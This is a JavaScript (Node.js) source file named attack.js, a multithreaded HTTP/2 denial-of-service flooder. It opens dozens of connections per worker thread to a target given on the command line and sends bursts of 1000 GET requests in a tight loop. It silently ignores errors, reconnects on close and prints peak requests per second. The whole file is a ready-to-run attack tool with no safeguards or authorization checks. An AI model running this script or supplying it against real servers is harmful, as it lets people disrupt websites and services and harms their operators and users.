const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.min(14, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;
    let requestCount = 0;
    let peakRPS = 0;

    // Function to track and log peak RPS
    function logPeakRPS() {
        const rps = requestCount / (duration - (end - Date.now())) * 1000;
        if (rps > peakRPS) {
            peakRPS = rps;
            console.clear();
            console.log(`PEAK RPS: ${Math.round(peakRPS)}`);
        }
    }

    // Flooding logic to hit CPU hard
    function startFlood(client) {
        const interval = setInterval(() => {
            if (Date.now() > end) {
                clearInterval(interval);
                return;
            }

            try {
                // Send 1000 requests as quickly as possible
                for (let i = 0; i < 1000; i++) {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('error', () => {}); // Ignore errors
                    req.end();
                    requestCount++; // Increment request counter for RPS calculation
                }
            } catch (err) {
                // Log the error but continue pushing requests
            }

            // Log peak RPS every second
            logPeakRPS();
        }, 0); // The tightest interval possible
    }

    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
        } catch (err) {
            return setTimeout(createConnection, 250); // Retry connection
        }

        client.on('error', () => {}); // Ignore connection errors
        client.on('close', () => setTimeout(createConnection, 100)); // Reconnect on close
        client.on('connect', () => startFlood(client)); // Start flooding once connected
    }

    // Maximize connections to target as quickly as possible
    for (let i = 0; i < 50; i++) { // Increase the number of connections per worker
        createConnection();
    }
}
